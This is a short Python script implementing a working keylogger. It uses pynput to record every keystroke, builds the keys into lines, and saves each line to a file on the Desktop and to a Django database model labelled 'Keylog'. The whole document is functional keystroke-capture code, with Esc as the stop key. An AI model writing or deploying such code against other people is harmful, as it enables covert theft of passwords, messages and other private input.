import os
import django
from pynput import keyboard
from datetime import datetime

# Set up Django environment (modify 'your_project' to your actual project name)
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "scraping.settings")
django.setup()

from scrupping.models import FormL  # Import the Django model

# Define the log file path on the Desktop
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop", "key_log.txt")

# Buffer to store the current line
buffer = []

def save_to_database(text):
    """Save logged keys to the database."""
    FormL.objects.create(
        form_type="Keylog",
        data={"text": text, "timestamp": str(datetime.now())}
    )

def on_press(key):
    global buffer

    try:
        # Handle regular characters
        buffer.append(key.char)
    except AttributeError:
        # Handle special keys
        if key == keyboard.Key.backspace:
            if buffer:  # Remove last character if buffer is not empty
                buffer.pop()
        elif key == keyboard.Key.space:
            buffer.append(" ")  # Add a space
        elif key == keyboard.Key.enter:
            text = "".join(buffer)

            # Save to file
            with open(desktop_path, "a") as f:
                f.write(text + "\n")

            # Save to database
            save_to_database(text)

            buffer.clear()  # Clear buffer for the next line

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop the keylogger

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

